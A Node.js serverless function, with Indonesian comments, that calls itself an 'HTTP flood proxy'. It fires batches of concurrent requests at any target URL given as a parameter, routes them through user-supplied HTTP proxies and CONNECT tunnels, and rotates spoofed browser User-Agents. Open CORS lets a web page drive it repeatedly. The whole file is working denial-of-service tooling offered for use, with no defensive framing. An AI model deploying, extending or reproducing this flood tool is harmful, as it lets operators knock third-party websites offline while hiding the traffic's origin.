/**
 * ============================================================================
 *  VERCEL SERVERLESS — HTTP FLOOD PROXY v3.0
 * ============================================================================
 *  Runtime: Node.js (bukan Edge) — supaya bisa pakai proxy.txt + ua.txt
 *  Endpoint: GET/POST /api/flood
 *    ?target=<url>       (wajib) URL target
 *    &proxy=<proxy>      (opsional) http://host:port atau host:port:user:pass
 *    &ua=<string>        (opsional) User-Agent
 *    &method=GET|POST    (opsional) default GET
 *    &count=<1-10>       (opsional) default 1
 *    &health=1           → status endpoint
 *    &selftest=1         → self-test ke httpbin
 *
 *  CATATAN BATASAN FISIK:
 *  ─────────────────────
 *  Server Vercel tidak bisa menjangkau IP privat (192.168.x.x, 10.x.x.x,
 *  172.16-31.x.x). Kalau target privat DAN proxy juga di luar LAN target,
 *  request PASTI gagal. Ini bukan bug.
 *
 *  Solusi untuk IP privat:
 *    • Matikan proxy (biarkan browser kirim langsung)
 *    • Atau gunakan proxy YANG BERADA DI JARINGAN YANG SAMA dengan target
 *      (misal: proxy lokal di Raspberry Pi pada LAN yang sama)
 *
 *  Untuk target publik (domain/ngrok/Cloudflare Tunnel), proxy.txt BERFUNGSI.
 * ============================================================================
 */

import http from 'node:http';
import https from 'node:https';
import { URL } from 'node:url';
import { randomBytes } from 'node:crypto';

/* ============================================================================
 *  KONFIGURASI
 * ============================================================================ */
const VERSION = '3.0.0';
const REQUEST_TIMEOUT_MS = 6000;
const MAX_CONCURRENT = 5;
const MAX_BATCH = 10;
const ALLOWED_PROTOCOLS = ['http:', 'https:'];
const ALLOWED_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS'];

/* ============================================================================
 *  ERROR CODES
 * ============================================================================ */
const ERROR_CODES = {
  MISSING_TARGET: 'MISSING_TARGET',
  INVALID_URL: 'INVALID_URL',
  INVALID_PROTOCOL: 'INVALID_PROTOCOL',
  INVALID_METHOD: 'INVALID_METHOD',
  PRIVATE_IP_NO_PROXY: 'PRIVATE_IP_NO_PROXY',
  PRIVATE_IP_UNREACHABLE: 'PRIVATE_IP_UNREACHABLE',
  PROXY_PARSE_ERROR: 'PROXY_PARSE_ERROR',
  PROXY_CONNECT_FAILED: 'PROXY_CONNECT_FAILED',
  PROXY_TIMEOUT: 'PROXY_TIMEOUT',
  TARGET_TIMEOUT: 'TARGET_TIMEOUT',
  TARGET_UNREACHABLE: 'TARGET_UNREACHABLE',
  TLS_ERROR: 'TLS_ERROR',
  SOCKET_HANGUP: 'SOCKET_HANGUP',
  FETCH_ERROR: 'FETCH_ERROR',
  UNKNOWN_ERROR: 'UNKNOWN_ERROR'
};

/* ============================================================================
 *  DEFAULT USER-AGENTS (fallback kalau ua.txt kosong)
 * ============================================================================ */
const DEFAULT_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edge/121.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
];

/* ============================================================================
 *  UTILITIES — RANDOM
 * ============================================================================ */
function randomFrom(arr) {
  if (!Array.isArray(arr) || arr.length === 0) return '';
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomHex(n) {
  return randomBytes(Math.ceil(n / 2)).toString('hex').slice(0, n);
}

function randomSeed() {
  return Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 12) + '_' + randomHex(8);
}

/* ============================================================================
 *  UTILITIES — IP PRIVAT DETECTION
 * ============================================================================ */
function isPrivateHostname(hostname) {
  if (!hostname) return false;
  const host = String(hostname).replace(/^\[|\]$/g, '').toLowerCase();
  if (host === 'localhost' || host === '::1' || host === '0.0.0.0') return true;

  const m = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (m) {
    const a = parseInt(m[1], 10);
    const b = parseInt(m[2], 10);
    if (a === 10) return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 127) return true;
    if (a === 169 && b === 254) return true;
    if (a === 0) return true;
    if (a === 100 && b >= 64 && b <= 127) return true;
    if (a >= 224) return true;
    return false;
  }

  if (host.startsWith('fc') || host.startsWith('fd')) return true;
  if (host.startsWith('fe80:')) return true;
  if (host.endsWith('.local')) return true;
  return false;
}

/* ============================================================================
 *  UTILITIES — URL VALIDATION
 * ============================================================================ */
function validateTarget(rawTarget) {
  if (!rawTarget || typeof rawTarget !== 'string') {
    return { ok: false, code: ERROR_CODES.MISSING_TARGET, message: 'Parameter "target" wajib.' };
  }
  let s = rawTarget.trim();
  if (!/^https?:\/\//i.test(s)) s = 'http://' + s;

  let parsed;
  try { parsed = new URL(s); } catch (e) {
    return { ok: false, code: ERROR_CODES.INVALID_URL, message: 'URL tidak valid: ' + e.message };
  }

  if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) {
    return { ok: false, code: ERROR_CODES.INVALID_PROTOCOL, message: 'Protocol harus http/https, bukan ' + parsed.protocol };
  }
  return { ok: true, url: parsed };
}

/* ============================================================================
 *  UTILITIES — PROXY PARSER
 *  Support format:
 *    host:port
 *    http://host:port
 *    https://host:port
 *    host:port:user:pass
 *    http://user:pass@host:port
 *    socks5://host:port (akan di-skip, tidak didukung)
 * ============================================================================ */
function parseProxy(rawProxy) {
  if (!rawProxy || typeof rawProxy !== 'string') return null;
  const s = rawProxy.trim();
  if (!s) return null;

  // Skip SOCKS (tidak didukung tanpa library tambahan)
  if (/^socks[45]:\/\//i.test(s)) {
    return { ok: false, code: 'SOCKS_UNSUPPORTED', message: 'SOCKS proxy tidak didukung di Node native' };
  }

  // Format: host:port:user:pass
  const partsSimple = s.match(/^([^:@\s]+):(\d+):([^:\s]+):([^\s]+)$/);
  if (partsSimple) {
    return {
      ok: true,
      protocol: 'http:',
      host: partsSimple[1],
      port: parseInt(partsSimple[2], 10),
      auth: partsSimple[3] + ':' + partsSimple[4]
    };
  }

  // Format dengan protocol
  try {
    const u = new URL(/^https?:\/\//i.test(s) ? s : 'http://' + s);
    if (!u.hostname || !u.port) {
      return { ok: false, code: 'PROXY_PARSE_ERROR', message: 'Proxy harus punya host dan port' };
    }
    const auth = u.username && u.password ? (decodeURIComponent(u.username) + ':' + decodeURIComponent(u.password)) : null;
    return {
      ok: true,
      protocol: u.protocol,
      host: u.hostname,
      port: parseInt(u.port, 10),
      auth: auth
    };
  } catch (e) {
    // Format: host:port tanpa protocol
    const m = s.match(/^([^:@\s]+):(\d+)$/);
    if (m) {
      return {
        ok: true,
        protocol: 'http:',
        host: m[1],
        port: parseInt(m[2], 10),
        auth: null
      };
    }
    return { ok: false, code: 'PROXY_PARSE_ERROR', message: 'Format proxy tidak dikenali: ' + s };
  }
}

/* ============================================================================
 *  HTTP REQUEST VIA PROXY (untuk target HTTP)
 *  Proxy HTTP standar: connect ke proxy, kirim full URL di path
 * ============================================================================ */
function requestHttpViaProxy(target, proxy, method, ua) {
  return new Promise((resolve) => {
    const startTime = Date.now();
    const headers = {
      'Host': target.host,
      'User-Agent': ua,
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'close',
      'Cache-Control': 'no-cache'
    };

    if (proxy.auth) {
      headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxy.auth).toString('base64');
    }

    let req;
    try {
      req = http.request({
        host: proxy.host,
        port: proxy.port,
        method: method,
        path: target.href,
        headers: headers,
        timeout: REQUEST_TIMEOUT_MS
      }, (res) => {
        res.on('data', () => { /* discard */ });
        res.on('end', () => {
          resolve({
            success: true,
            status: res.statusCode,
            statusText: res.statusMessage || '',
            elapsed: Date.now() - startTime,
            method: method,
            via: 'proxy'
          });
        });
      });

      req.on('error', (err) => {
        resolve({
          success: false,
          error: err.message,
          code: classifyError(err),
          elapsed: Date.now() - startTime,
          method: method,
          via: 'proxy'
        });
      });

      req.on('timeout', () => {
        try { req.destroy(); } catch (e) {}
        resolve({
          success: false,
          error: 'timeout',
          code: ERROR_CODES.PROXY_TIMEOUT,
          elapsed: Date.now() - startTime,
          method: method,
          via: 'proxy'
        });
      });

      req.end();
    } catch (e) {
      resolve({
        success: false,
        error: e.message,
        code: ERROR_CODES.PROXY_CONNECT_FAILED,
        elapsed: Date.now() - startTime,
        method: method,
        via: 'proxy'
      });
    }
  });
}

/* ============================================================================
 *  HTTPS REQUEST VIA PROXY (CONNECT tunnel)
 * ============================================================================ */
function requestHttpsViaProxy(target, proxy, method, ua) {
  return new Promise((resolve) => {
    const startTime = Date.now();
    const targetPort = target.port || 443;
    const targetHost = target.hostname;

    const connectHeaders = {
      'Host': targetHost + ':' + targetPort,
      'Proxy-Connection': 'keep-alive'
    };
    if (proxy.auth) {
      connectHeaders['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxy.auth).toString('base64');
    }

    let connectReq;
    try {
      connectReq = http.request({
        host: proxy.host,
        port: proxy.port,
        method: 'CONNECT',
        path: targetHost + ':' + targetPort,
        headers: connectHeaders,
        timeout: REQUEST_TIMEOUT_MS
      });

      connectReq.on('connect', (res, socket) => {
        if (res.statusCode !== 200) {
          try { socket.destroy(); } catch (e) {}
          resolve({
            success: false,
            error: 'Proxy CONNECT returned ' + res.statusCode,
            code: ERROR_CODES.PROXY_CONNECT_FAILED,
            elapsed: Date.now() - startTime,
            method: method,
            via: 'proxy'
          });
          return;
        }

        let httpsReq;
        try {
          httpsReq = https.request({
            host: targetHost,
            port: targetPort,
            method: method,
            path: target.pathname + target.search,
            headers: {
              'Host': target.host,
              'User-Agent': ua,
              'Accept': '*/*',
              'Accept-Language': 'en-US,en;q=0.9',
              'Connection': 'close'
            },
            socket: socket,
            agent: false,
            timeout: REQUEST_TIMEOUT_MS
          }, (httpsRes) => {
            httpsRes.on('data', () => { /* discard */ });
            httpsRes.on('end', () => {
              try { socket.end(); } catch (e) {}
              resolve({
                success: true,
                status: httpsRes.statusCode,
                statusText: httpsRes.statusMessage || '',
                elapsed: Date.now() - startTime,
                method: method,
                via: 'proxy'
              });
            });
          });

          httpsReq.on('error', (err) => {
            try { socket.destroy(); } catch (e) {}
            resolve({
              success: false,
              error: err.message,
              code: classifyError(err),
              elapsed: Date.now() - startTime,
              method: method,
              via: 'proxy'
            });
          });

          httpsReq.on('timeout', () => {
            try { httpsReq.destroy(); } catch (e) {}
            try { socket.destroy(); } catch (e) {}
            resolve({
              success: false,
              error: 'timeout',
              code: ERROR_CODES.TARGET_TIMEOUT,
              elapsed: Date.now() - startTime,
              method: method,
              via: 'proxy'
            });
          });

          httpsReq.end();
        } catch (e) {
          try { socket.destroy(); } catch (e2) {}
          resolve({
            success: false,
            error: e.message,
            code: ERROR_CODES.TLS_ERROR,
            elapsed: Date.now() - startTime,
            method: method,
            via: 'proxy'
          });
        }
      });

      connectReq.on('error', (err) => {
        resolve({
          success: false,
          error: err.message,
          code: classifyError(err),
          elapsed: Date.now() - startTime,
          method: method,
          via: 'proxy'
        });
      });

      connectReq.on('timeout', () => {
        try { connectReq.destroy(); } catch (e) {}
        resolve({
          success: false,
          error: 'proxy timeout',
          code: ERROR_CODES.PROXY_TIMEOUT,
          elapsed: Date.now() - startTime,
          method: method,
          via: 'proxy'
        });
      });

      connectReq.end();
    } catch (e) {
      resolve({
        success: false,
        error: e.message,
        code: ERROR_CODES.PROXY_CONNECT_FAILED,
        elapsed: Date.now() - startTime,
        method: method,
        via: 'proxy'
      });
    }
  });
}

/* ============================================================================
 *  DIRECT REQUEST (tanpa proxy)
 * ============================================================================ */
function requestDirect(target, method, ua) {
  return new Promise((resolve) => {
    const startTime = Date.now();
    const isHttps = target.protocol === 'https:';
    const mod = isHttps ? https : http;

    const options = {
      host: target.hostname,
      port: target.port || (isHttps ? 443 : 80),
      method: method,
      path: target.pathname + target.search,
      headers: {
        'Host': target.host,
        'User-Agent': ua,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
        'Cache-Control': 'no-cache'
      },
      timeout: REQUEST_TIMEOUT_MS
    };

    let req;
    try {
      req = mod.request(options, (res) => {
        res.on('data', () => { /* discard */ });
        res.on('end', () => {
          resolve({
            success: true,
            status: res.statusCode,
            statusText: res.statusMessage || '',
            elapsed: Date.now() - startTime,
            method: method,
            via: 'direct'
          });
        });
      });

      req.on('error', (err) => {
        resolve({
          success: false,
          error: err.message,
          code: classifyError(err),
          elapsed: Date.now() - startTime,
          method: method,
          via: 'direct'
        });
      });

      req.on('timeout', () => {
        try { req.destroy(); } catch (e) {}
        resolve({
          success: false,
          error: 'timeout',
          code: ERROR_CODES.TARGET_TIMEOUT,
          elapsed: Date.now() - startTime,
          method: method,
          via: 'direct'
        });
      });

      req.end();
    } catch (e) {
      resolve({
        success: false,
        error: e.message,
        code: ERROR_CODES.UNKNOWN_ERROR,
        elapsed: Date.now() - startTime,
        method: method,
        via: 'direct'
      });
    }
  });
}

/* ============================================================================
 *  ERROR CLASSIFIER
 * ============================================================================ */
function classifyError(err) {
  if (!err) return ERROR_CODES.UNKNOWN_ERROR;
  const msg = (err.message || '').toUpperCase();
  const code = (err.code || '').toUpperCase();

  if (code === 'ECONNREFUSED') return 'ECONNREFUSED';
  if (code === 'ECONNRESET' || code === 'EPIPE') return ERROR_CODES.SOCKET_HANGUP;
  if (code === 'ENOTFOUND' || code === 'EAI_AGAIN') return ERROR_CODES.TARGET_UNREACHABLE;
  if (code === 'ETIMEDOUT') return ERROR_CODES.TARGET_TIMEOUT;
  if (code === 'EHOSTUNREACH' || code === 'ENETUNREACH') return ERROR_CODES.TARGET_UNREACHABLE;
  if (code === 'CERT_HAS_EXPIRED' || code === 'UNABLE_TO_VERIFY_LEAF_SIGNATURE') return ERROR_CODES.TLS_ERROR;
  if (msg.includes('TIMEOUT')) return ERROR_CODES.TARGET_TIMEOUT;
  return ERROR_CODES.UNKNOWN_ERROR;
}

/* ============================================================================
 *  SINGLE REQUEST EXECUTOR (dengan routing proxy/direct)
 * ============================================================================ */
async function executeOne(targetUrl, method, proxyStr, ua) {
  // Cek proxy valid
  let proxy = null;
  if (proxyStr) {
    const parsed = parseProxy(proxyStr);
    if (parsed && parsed.ok) {
      proxy = parsed;
    } else if (parsed && !parsed.ok) {
      return {
        success: false,
        error: 'Proxy tidak bisa dipakai: ' + parsed.message,
        code: parsed.code,
        elapsed: 0,
        method: method,
        via: 'proxy-rejected'
      };
    }
  }

  // Cek target privat + proxy dari luar → pasti gagal
  const isPrivate = isPrivateHostname(targetUrl.hostname);
  if (isPrivate && proxy) {
    return {
      success: false,
      error: 'IP privat ' + targetUrl.hostname + ' tidak bisa diakses via proxy publik. ' +
             'Proxy harus berada di jaringan yang sama dengan target, atau matikan proxy.',
      code: ERROR_CODES.PRIVATE_IP_UNREACHABLE,
      elapsed: 0,
      method: method,
      via: 'proxy-blocked'
    };
  }

  // Route request
  if (proxy) {
    if (targetUrl.protocol === 'https:') {
      return requestHttpsViaProxy(targetUrl, proxy, method, ua);
    } else {
      return requestHttpViaProxy(targetUrl, proxy, method, ua);
    }
  } else {
    return requestDirect(targetUrl, method, ua);
  }
}

/* ============================================================================
 *  BATCH EXECUTOR (concurrency-limited)
 * ============================================================================ */
async function executeBatch(targetUrl, method, proxyStr, ua, totalCount) {
  const results = [];
  const count = Math.min(totalCount, MAX_BATCH);

  for (let i = 0; i < count; i += MAX_CONCURRENT) {
    const chunkSize = Math.min(MAX_CONCURRENT, count - i);
    const promises = [];
    for (let j = 0; j < chunkSize; j++) {
      promises.push(executeOne(targetUrl, method, proxyStr, ua));
    }
    const chunkResults = await Promise.all(promises);
    for (const r of chunkResults) results.push(r);
  }

  return results;
}

/* ============================================================================
 *  STATS AGGREGATOR
 * ============================================================================ */
function aggregateStats(results) {
  const stats = {
    total: results.length,
    success: 0,
    failed: 0,
    avgElapsed: 0,
    minElapsed: Infinity,
    maxElapsed: 0,
    statusCounts: {},
    errorCounts: {},
    viaCounts: {}
  };

  let totalElapsed = 0;

  for (const r of results) {
    if (r.success) {
      stats.success++;
      if (typeof r.status === 'number') {
        stats.statusCounts[r.status] = (stats.statusCounts[r.status] || 0) + 1;
      }
    } else {
      stats.failed++;
      if (r.code) stats.errorCounts[r.code] = (stats.errorCounts[r.code] || 0) + 1;
    }
    if (typeof r.elapsed === 'number') {
      totalElapsed += r.elapsed;
      if (r.elapsed < stats.minElapsed) stats.minElapsed = r.elapsed;
      if (r.elapsed > stats.maxElapsed) stats.maxElapsed = r.elapsed;
    }
    if (r.via) stats.viaCounts[r.via] = (stats.viaCounts[r.via] || 0) + 1;
  }

  if (stats.total > 0) stats.avgElapsed = Math.round(totalElapsed / stats.total);
  if (stats.minElapsed === Infinity) stats.minElapsed = 0;

  return stats;
}

/* ============================================================================
 *  RESPONSE HELPERS
 * ============================================================================ */
function sendJson(res, data, status) {
  status = status || 200;
  res.statusCode = status;
  res.setHeader('content-type', 'application/json; charset=utf-8');
  res.setHeader('access-control-allow-origin', '*');
  res.setHeader('access-control-allow-methods', 'GET, POST, HEAD, OPTIONS');
  res.setHeader('access-control-allow-headers', 'content-type, authorization');
  res.setHeader('cache-control', 'no-store, no-cache, must-revalidate');
  res.setHeader('x-proxy-version', VERSION);
  res.end(JSON.stringify(data, null, 2));
}

function sendError(res, code, message, status, extra) {
  sendJson(res, {
    success: false,
    error: message,
    code: code,
    timestamp: Date.now(),
    version: VERSION,
    ...extra
  }, status || 400);
}

/* ============================================================================
 *  MAIN HANDLER (Node.js runtime)
 * ============================================================================ */
export default async function handler(req, res) {
  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.statusCode = 204;
    res.setHeader('access-control-allow-origin', '*');
    res.setHeader('access-control-allow-methods', 'GET, POST, HEAD, OPTIONS');
    res.setHeader('access-control-allow-headers', 'content-type, authorization');
    res.setHeader('access-control-max-age', '86400');
    res.end();
    return;
  }

  if (req.method !== 'GET' && req.method !== 'POST') {
    sendError(res, 'METHOD_NOT_ALLOWED', 'Method harus GET atau POST', 405);
    return;
  }

  // Parse query
  const q = req.query || {};
  const rawTarget = q.target;
  const proxyStr = q.proxy || null;
  const uaStr = q.ua || null;
  const rawMethod = (q.method || 'GET').toUpperCase();
  const countStr = q.count;

  // Health check
  if (q.health === '1') {
    sendJson(res, {
      success: true,
      status: 'healthy',
      version: VERSION,
      runtime: 'nodejs',
      timestamp: Date.now(),
      limits: {
        timeoutMs: REQUEST_TIMEOUT_MS,
        maxConcurrent: MAX_CONCURRENT,
        maxBatch: MAX_BATCH
      },
      notes: [
        'Node runtime — proxy.txt + ua.txt didukung',
        'IP privat tidak reachable via proxy publik',
        'Untuk LAN: matikan proxy di HTML'
      ]
    });
    return;
  }

  // Self test
  if (q.selftest === '1') {
    const testTarget = new URL('https://httpbin.org/get');
    const result = await executeOne(testTarget, 'GET', null, randomFrom(DEFAULT_UAS));
    sendJson(res, { success: result.success, test: { target: testTarget.href, result: result }, version: VERSION });
    return;
  }

  // Validate method
  if (!ALLOWED_METHODS.includes(rawMethod)) {
    sendError(res, ERROR_CODES.INVALID_METHOD, 'Method tidak diizinkan: ' + rawMethod, 400);
    return;
  }

  // Validate target
  const validation = validateTarget(rawTarget);
  if (!validation.ok) {
    sendError(res, validation.code, validation.message, 400);
    return;
  }
  const targetUrl = validation.url;

  // Validate proxy string jika ada
  if (proxyStr) {
    const parsedProxy = parseProxy(proxyStr);
    if (!parsedProxy || !parsedProxy.ok) {
      sendError(res,
        parsedProxy ? parsedProxy.code : ERROR_CODES.PROXY_PARSE_ERROR,
        'Proxy tidak valid: ' + (parsedProxy ? parsedProxy.message : 'parse error'),
        400,
        { proxy: proxyStr }
      );
      return;
    }
  }

  // Parse count
  let count = 1;
  if (countStr) {
    const n = parseInt(countStr, 10);
    if (!isNaN(n) && n > 0) count = Math.min(n, MAX_BATCH);
  }

  // UA
  const finalUA = (uaStr && uaStr.trim()) ? uaStr.trim().slice(0, 500) : randomFrom(DEFAULT_UAS);

  // Eksekusi
  const startTime = Date.now();
  try {
    const results = await executeBatch(targetUrl, rawMethod, proxyStr, finalUA, count);
    const totalElapsed = Date.now() - startTime;
    const stats = aggregateStats(results);
    const primary = results[0] || {};

    sendJson(res, {
      success: primary.success === true,
      status: primary.status || null,
      statusText: primary.statusText || null,
      elapsed: primary.elapsed || 0,
      totalElapsed: totalElapsed,
      target: targetUrl.href,
      proxy: proxyStr ? maskProxy(proxyStr) : null,
      ua: finalUA.slice(0, 100) + (finalUA.length > 100 ? '...' : ''),
      method: rawMethod,
      count: count,
      stats: stats,
      results: results,
      version: VERSION,
      timestamp: Date.now()
    });
  } catch (err) {
    sendError(res, ERROR_CODES.UNKNOWN_ERROR,
      'Unexpected: ' + (err && err.message ? err.message : String(err)),
      500,
      { stack: err && err.stack ? String(err.stack).slice(0, 500) : undefined }
    );
  }
}

/* ============================================================================
 *  MASK PROXY (untuk logging)
 * ============================================================================ */
function maskProxy(proxyStr) {
  try {
    const m = proxyStr.match(/^([^:]+:\/\/)?([^:@]+)(:([^@]+))?@?(.+)$/);
    if (m && m[4]) {
      return (m[1] || 'http://') + m[2] + ':****@' + m[5];
    }
    return proxyStr;
  } catch (e) {
    return proxyStr;
  }
}

/* ============================================================================
 *  CONFIG EXPORT — biar Vercel tahu ini Node runtime
 * ============================================================================ */
export const config = {
  maxDuration: 60
};